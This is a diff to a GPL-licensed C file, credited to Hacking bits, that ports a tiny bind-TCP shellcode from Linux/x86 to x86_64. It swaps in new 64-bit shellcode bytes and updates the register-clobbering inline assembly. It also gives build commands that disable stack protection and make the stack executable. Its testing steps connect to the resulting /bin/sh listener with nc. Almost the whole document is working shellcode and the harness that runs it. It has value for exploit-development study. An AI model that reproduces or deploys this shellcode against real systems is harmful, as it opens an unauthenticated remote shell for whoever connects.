@@ -1,6 +1,6 @@
 /*
 
- Tiny Shell Bind TCP Random Port Shellcode - C Language - Linux/x86
+ Tiny Shell Bind TCP Random Port Shellcode - C Language - Linux/x86_64
  Copyright (C) 2013 Geyslan G. Bem, Hacking bits
 
    http://hackingbits.com
@@ -17,23 +17,23 @@
  GNU General Public License for more details.
 
  You should have received a copy of the GNU General Public License
- along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ along with this program.  If not, see <http://www.gnu.org/licenses/>
 
 */
 
 
 /*
 
-   tiny_shell_bind_tcp_random_port_shellcode
+   tiny_shell_bind_tcp_random_port_shellcode_x86_64
 
    * 57 bytes
    * null-free
 
 
-   # gcc -m32 -fno-stack-protector -z execstack tiny_shell_bind_tcp_random_port_shellcode.c -o tiny_shell_bind_tcp_random_port_shellcode
+   # gcc -m64 -fno-stack-protector -z execstack tiny_shell_bind_tcp_random_port_shellcode_x86_64.c -o tiny_shell_bind_tcp_random_port_shellcode_x86_64
 
    Testing
-   # ./tiny_shell_bind_tcp_random_port_shellcode
+   # ./tiny_shell_bind_tcp_random_port_shellcode_x86_64
    # netstat -anp | grep shell
    # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to the port open by shellcode)
    # nc 127.0.0.1 port
@@ -46,12 +46,12 @@
 
 unsigned char code[] = \
 
-"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a"
-"\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0"
-"\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80"
-"\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8"
-"\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62"
-"\x69\x6e\x89\xe3\x41\xcd\x80";
+"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02"
+"\x5f\xb0\x29\x0f\x05\x52\x5e\x50\x5f\xb0"
+"\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
+"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52"
+"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
+"\x57\x54\x5f\xb0\x3b\x0f\x05";
 
 main ()
 {
@@ -62,13 +62,13 @@ main ()
 
 	// Pollutes all registers ensuring that the shellcode runs in any circumstance.
 
-	__asm__ ("movl $0xffffffff, %eax\n\t"
-		 "movl %eax, %ebx\n\t"
-		 "movl %eax, %ecx\n\t"
-		 "movl %eax, %edx\n\t"
-		 "movl %eax, %esi\n\t"
-		 "movl %eax, %edi\n\t"
-		 "movl %eax, %ebp\n\t"
+	__asm__ ("mov $0xffffffffffffffff, %rax\n\t"
+		 "mov %rax, %rbx\n\t"
+		 "mov %rax, %rcx\n\t"
+		 "mov %rax, %rdx\n\t"
+		 "mov %rax, %rsi\n\t"
+		 "mov %rax, %rdi\n\t"
+		 "mov %rax, %rbp\n\t"
 
 	// Calling the shellcode
 		 "call code");
